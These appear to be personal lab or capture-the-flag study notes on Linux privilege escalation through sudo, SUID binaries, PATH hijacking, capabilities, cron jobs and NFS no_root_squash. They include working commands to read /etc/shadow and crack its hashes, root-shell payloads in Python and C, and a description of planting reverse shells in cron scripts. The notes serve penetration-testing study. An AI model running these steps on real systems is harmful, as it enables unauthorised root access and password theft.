# Privilege escalation: Sudo
```
SUID binaries run with the privileges of the owner of the file.

If owner is root, it starts to get dangerous.
```
`sudo-l` to get SUID binaries

### Example
we found we can run `/bin/cat` as root. 

that means we can read `/etc/shadow` to get password hashes and crack them offline

## Leverage Application Functions

### Example

we found we can abuse the error handling of apache2's `-C` option to peak into `/etc/shadow`

we will force an error by loading a non-existing module, like this:
```
sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
```
"**syntax error**" and the first line of `/etc/shadow` printed to the screen (usually root password hash)

---
# Privesc: SUID binaries
``` 
misconfigured SUID binaries are so dangerous that they deserve two sections
```

## find files with SUID or SGID bit set
`find / -type f -perm -04000 -ls 2>/dev/null`

you would usually like to check it against [GTFOBins](https://gtfobins.org/), to see if they are abusable

### Example
We found out that nano has the SUID bit set.

we have two obvious pathways
1) try to read `/etc/shadow`

2) add our user to `/etc/passwd`

## Reading /etc/shadow
```
find / -type f -perm -04000 -ls 2>/dev/null 
# we found nano has SUID set
nano /etc/shadow
# we copy it to passwd.txt

# do the same for /etc/passwd
nano /etc/passwd

# unshadow combines shadow and passwd
unshadow passwd.txt shadow.txt > passwords.txt

# then we use john to hopefully crack some hashes
...
```

---
# Privesc: PATH

### What is PATH?
```
PATH in Linux is an environmental variable that tells the operating system where to search for executables
```
basically, if you type a command that is not instantly recognized, the OS will look in $PATH folders for that concrete executable


imagine a program binary that will look for a "thm" executable in the PATH variable. This program runs with root privileges.

a possible exploit would be:
1) check the PATH variable with `echo $PATH`
2) find writable directories `find / -writable 2>/dev/null`
3) if one of those is in PATH, skip step 4 and use that folder in step 5
4) we chose /tmp from writable dirs and add it to PATH with `export PATH=/tmp:$PATH`
5) we now craft a simple executable in /tmp
    ```
    $ cd /tmp
    $ echo "/bin/bash" > thm
    $ chmod 777 thm
    ```
6) we now run the program and it will execute our "give us root shell" script

---
# Privesc: Capabilities
```
capabilities are another method of managing the privilege level of a process/binary
```
don't need to give the user more privileges, just give the binary, for which they need higher priviliges, some capabilities.

get capabilities: `getcap -r / 2>/dev/null`

eg. `cap_setuid+ep` capability allows a binary to change its user ID to any user (eg. root)

[GTFOBins](https://gtfobins.org/) has a list of binaries that can be used for privilege escalation, along with the payloads

Example:

we ran `getcap -r / 2>/dev/null`

we found `/usr/bin/python3.12`
we crafted a python payload to get root shell:
```
import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```
ran the payload with `python3 payload.py` and got a root shell (only uid is 0(root), not gid or groups)

---

# Privesc: Cron Jobs
```
Cron jobs are run scripts or binaries at specified times (eg. every minute or weekly)
```
anyone can view them with `cat /etc/crontab`

#### if there is let's say
+ a cron job that runs as root
+ it executes a script
+ that script is writable by us

that is **ultra vulnerable**

we would then inject a revshell in the script and wait for the cron job to do it's job and give us root shell

#### another example
+ badmin used a cron job to run script.sh regularly
+ badmin deleted the script.sh because it was not needed anymore
+ badmin did not remove the cron job

don't be like badmin, we will create our own script.sh with a revshell and wait for root

cronjobs can also be found in
+ `/etc/cron.d/`
+ `/etc/cron.daily/`
+ `/etc/cron.hourly/`
+ `/etc/cron.monthly/`
+ `/etc/cron.weekly/`
+ `/var/spool/cron/crontabs`

Example:

we exploited a cronjob in /etc/cron.d which ran a a `cleanup.sh` script

we changed the script to a revshell to attacker

# Privesc: NFS
```
NFS = Network File Sharing
```
it's good to share with friends, but not with everyone...

NFS configuration is kept in `/etc/exports`

enumerating target shares from attacker: `showmount -e <TARGET_IP>`

Example:
we looked at NFS configuration and then enumerated taget shares

we found a share that had no_root_squash option enabled, which means we can write files as root

we will mount to the share from attacker

```
$ mkdir /tmp/nfs
$ mount -o rw <TARGET_IP>:/vulnerable_share /tmp/nfs
$ cd /tmp/nfs
# made a C script that will execute /bin/bash
$ cat nfs.c
int main() {
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
$ gcc nfs.c -o nfs -w -static
$ chmod +s nfs
```
back to target, we will execute the nfs binary (not the C script) and get a root shell

---

The End, thanks for reading!

---